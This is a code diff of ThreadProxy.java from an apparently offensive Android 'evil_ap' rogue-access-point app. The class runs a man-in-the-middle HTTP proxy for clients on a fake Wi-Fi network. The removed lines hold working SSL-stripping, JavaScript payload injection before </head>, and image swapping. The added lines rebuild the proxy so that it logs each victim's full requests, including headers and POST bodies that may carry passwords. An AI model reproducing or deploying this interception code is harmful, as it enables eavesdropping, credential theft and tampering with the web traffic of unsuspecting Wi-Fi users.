@@ -3,7 +3,6 @@ package com.nibiru.evil_ap.proxy;
 import android.content.SharedPreferences;
 import android.util.Log;
 
-import com.nibiru.evil_ap.ConfigTags;
 import com.nibiru.evil_ap.SharedClass;
 import com.nibiru.evil_ap.log.Client;
 
@@ -13,15 +12,14 @@ import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.io.OutputStream;
-import java.io.UnsupportedEncodingException;
 import java.net.Socket;
 import java.net.SocketTimeoutException;
-import java.util.List;
 
 import javax.net.ssl.SSLProtocolException;
 
-import okhttp3.OkHttpClient;
+import okhttp3.MediaType;
 import okhttp3.Request;
+import okhttp3.RequestBody;
 import okhttp3.Response;
 
 /**
@@ -33,23 +31,13 @@ public class ThreadProxy implements Runnable{
     protected final String TAG = getClass().getSimpleName();
     private Socket sClient;
     private Client c;
-    private OkHttpParser mParser;
-    private OkHttpClient okhttp;
-    private SharedPreferences mConfig;
     private SharedClass mSharedObj;
     private boolean debug = true;
     /**************************************CLASS METHODS*******************************************/
-    ThreadProxy(Socket sClient, SharedPreferences config, SharedClass sharedObj) {
+    ThreadProxy(Socket sClient, SharedClass sharedObj) {
         this.sClient = sClient;
-        mParser = new OkHttpParser();
-        //make client not follow redirects!
-        okhttp = new OkHttpClient().newBuilder().followRedirects(false).followSslRedirects(false)
-                .build();
-        mConfig = config;
         mSharedObj = sharedObj;
-        //TODO: fucking shit is sometimes null
         c = mSharedObj.getClientByIp(sClient.getInetAddress().toString().substring(1));
-
     }
     @Override
     public void run() {
@@ -62,71 +50,23 @@ public class ThreadProxy implements Runnable{
             outToClient = sClient.getOutputStream();
 
             //get client request string
-            String sRequest = getRequestString(inFromClient);
-            if (sRequest == null) {return;}
+            Request req = getRequest(inFromClient, c);
+            if (req == null) return;
 
-            //parse string request into okhttp request (remove some security headers)
-            Request req = null;
-            if (sRequest.startsWith("GET"))
-                req = mParser.parse(sRequest, mSharedObj, c, "GET");
-            else if (sRequest.startsWith("POST"))
-                req = mParser.parse(sRequest, mSharedObj, c, "POST");
-            if (req == null) {return;}
+            //make request and get okhttp response
+            res = mSharedObj.getHttpClient().newCall(req).execute();
 
-            //make request and get response
-            res = okhttp.newCall(req).execute();
-            //if website doesn't support http but https
-            if(res.code() == 301){
-                String url = res.header("Location");
-                if (url.startsWith("https")){
-                    req = mParser.getReqForUrl(url);
-                    res = okhttp.newCall(req).execute();
-                }
-            }
-            //prepare response
-            byte[] bytesBody = res.body().bytes();
-            //prepare proper length for Content-Length response header
-            //but first check if we are sending back image and swapping it
-            String contentType = res.header("Content-Type");
-            boolean imgSwapFlag = contentType != null && contentType.contains("image")
-                    && mConfig.getBoolean(ConfigTags.imgReplace.toString(), false);
-            int bodyLen;
-            if (imgSwapFlag) {
-                bodyLen = mSharedObj.getImgDataLength();
-            }
-            else {
-                bodyLen = bytesBody.length;
-            }
-
-
-            //prepare response headers
-            String headers = getResponseHeaders(res, bodyLen, req.header("Etag"));
-            // In order to comply with protocol
+            //get and send response headers
+            String headers = getResponseHeaders(res);
+            //in order to comply with protocol
             headers = headers.replaceAll("\\n", "\r\n");
-
-
-            //if we are sending back image and imgReplace is on then swap img body
-            if (imgSwapFlag){
-                sendChunk(headers.getBytes(), outToClient);
-                sendChunk(mSharedObj.getImgData(), outToClient);
-            }
-            else { //else we are not swapping image or we are not sending image
-                //EDIT RESPONSE HERE (if it is text)
-                if (contentType != null && contentType.contains("text")) {
-                    boolean sslStrip = mConfig.getBoolean(ConfigTags.sslStrip.toString(), false);
-                    boolean jsInject = mConfig.getBoolean(ConfigTags.jsInject.toString(), false);
-                    if (bytesBody.length > 0 && (sslStrip || jsInject)) {
-                        bytesBody = editBytes(bytesBody, sslStrip, jsInject);
-                        setResponseHeader(headers, "Content-Length",
-                                Integer.toString(bytesBody.length));
-                    }
-                }
-                sendChunk(headers.getBytes(), outToClient);
-                sendChunk(bytesBody, outToClient);
-            }
-
+            sendBytes(headers.getBytes(), outToClient);
+            //get and send response bytes
+            byte[] bytesBody = res.body().bytes();
+            sendBytes(bytesBody, outToClient);
             if (debug) Log.d(TAG + "[OUT]", headers);
             outToClient.flush();
+
         } catch (IOException e) {
             if (e instanceof SocketTimeoutException)
                 Log.e(TAG, "TIMEOUT!");
@@ -137,44 +77,23 @@ public class ThreadProxy implements Runnable{
         } finally {
             //clean up
             if (res != null) res.body().close();
-             try {
-                 if (outToClient != null) outToClient.close();
-                 if (inFromClient != null) inFromClient.close();
-                 if (sClient != null) sClient.close();
-             }
-             catch (IOException e) {
-                 e.printStackTrace();
-             }
+            try {
+                if (outToClient != null) outToClient.close();
+                if (inFromClient != null) inFromClient.close();
+                if (sClient != null) sClient.close();
+            }
+            catch (IOException e) {
+                e.printStackTrace();
+            }
         }
     }
 
-    private void sendChunk(byte[] msg, OutputStream out) throws IOException{
+    private void sendBytes(byte[] msg, OutputStream out) throws IOException{
         out.write(msg, 0, msg.length);
         if (debug) Log.d(TAG + "[OUT]", "sent chunk!");
     }
 
-    private byte[] editBytes(byte[] bytesBody, Boolean sslStrip, Boolean jsInject) {
-        try {
-            String response = new String(bytesBody, "UTF-8");
-            if (sslStrip) {
-                response = response.replaceAll("https", "http");
-            }
-            if (jsInject){
-                List<String> payloads = mSharedObj.getPayloads();
-                String full = "";
-                for(String p: payloads){
-                    full += p;
-                }
-                response = response.replaceAll("</head>", full + "</head>");
-            }
-            return response.getBytes();
-        } catch (UnsupportedEncodingException e) {
-            e.printStackTrace();
-            return null;
-        }
-    }
-
-    private String getResponseHeaders(Response res, int len, String eTag) throws IOException {
+    private String getResponseHeaders(Response res) throws IOException {
         String resToClient = "";
         if (debug) Log.d(TAG, "<==================Sending response==================>");
         //find status line
@@ -191,60 +110,65 @@ public class ThreadProxy implements Runnable{
         }
         //send headers
         resToClient += res.headers().toString() + "\n";
-        //put entire content length, replace if chunked encoding, or just update content
-        resToClient = resToClient.replaceFirst("(?i)Transfer-Encoding: chunked",
-                "Content-Length: " + len);
-        resToClient = resToClient.replaceFirst("(?i)Content-Length: .*", "Content-Length: " + len);
-        //workaround for 304's not working
-        if (resToClient.startsWith("HTTP/1.1 304")) {
-            resToClient = resToClient.replaceAll("ETag:.*", "ETag: " + eTag);
-        }
-        //TODO: test preformance
-        //resToClient = resToClient.replaceAll("(?i)Connection: keep-alive", "Connection: close");
-        //resToClient = resToClient.replaceAll("(?i)\\nKeep-Alive.*", "");
         return resToClient;
     }
 
-    private String getRequestString(BufferedReader in) throws IOException {
-        String request = "";
+    private Request getRequest(BufferedReader in, Client c) throws IOException {
+        Request.Builder builder = new Request.Builder();
+        String requestLine = in.readLine();
+        String host = "";
+        StringBuilder headers = new StringBuilder();
         String body = "";
+        //we only support GET and POST requests
+        if (requestLine == null || !(requestLine.startsWith("GET")||
+                requestLine.startsWith("POST"))) {
+            Log.e(TAG, "UNSUPPORTED HTTP METHOD!");
+            return null;
+        }
+        String[] requestLineValues = requestLine.split("\\s+");
+
         String line;
         int length = 0;
+        String contentType= "";
         //read string request until there are no lines to read
         while ((line = in.readLine()) != null) {
             //last line of request message header is a blank line (\r\n\r\n)
-            if (line.isEmpty()) {
-                break;
+            if (line.isEmpty()) break;
+            //we read a header line
+            headers.append(line).append("\r\n");
+            String[] split = line.split(": ");
+            if (line.startsWith("Content-Length: ")){
+                length = Integer.parseInt(split[1]);
             }
-            if (line.startsWith("Content-Length")) { //get the content-length
-                int index = line.indexOf(':') + 1;
-                String len = line.substring(index).trim();
-                length = Integer.parseInt(len);
+            if (line.startsWith("Content-Type: ")){
+                contentType = split[1];
             }
-            //make sure content is not zipped...
-            //by not including the Accept-Encoding header
-            if (!line.startsWith("Accept-Encoding")) {
-                /*Log.d(TAG + "[IN]", "Accept-Encoding: identity");
-                request += "Accept-Encoding: identity\r\n";*/
-                if (debug) Log.d(TAG + "[IN]", line);
-                request += line + "\r\n";
+            if (line.startsWith("Host: ")){
+                host = split[1];
+                String url = "http://" + host + requestLineValues[1];
+                Log.d(TAG, url);
+                builder.url(url);
+            }
+            else {
+                builder.addHeader(split[0], split[1]);
             }
         }
-        // if there is Message body, go in to this loop
+
+        // if there is Message body, read it
         if (length > 0) {
             int read;
             while ((read = in.read()) != -1) {
                 body += ((char) read);
                 if (body.length() == length) break;
             }
+            //add body to okhttp request
+            builder.post(RequestBody.create(MediaType.parse(contentType), body));
         }
-        request += body; // adding the body to request
-        return request;
+        //LOG REQUEST BEING MADE
+        mSharedObj.addRequest(c, host, requestLine, headers.toString() + "\n" + body);
+        return builder.build();
     }
 
-    private String setResponseHeader(String res, String header, String val){
-        return res.replaceFirst("(?i)" + header + ".*", header +": " + val + "\n");
-    }
     /*************************************OLD METHODS**********************************************/
     private ByteArrayOutputStream swapImg(String headers, ByteArrayOutputStream streamResponse)
             throws IOException {
@@ -254,6 +178,11 @@ public class ThreadProxy implements Runnable{
         streamResponse.write(mSharedObj.getImgData());
         return streamResponse;
     }
+
+    private String setResponseHeader(String res, String header, String val){
+        return res.replaceFirst("(?i)" + header + ".*", header +": " + val + "\n");
+    }
+
     private String getEtag(String sRequest){
         String result = "";
         if (sRequest.contains("\"")) {
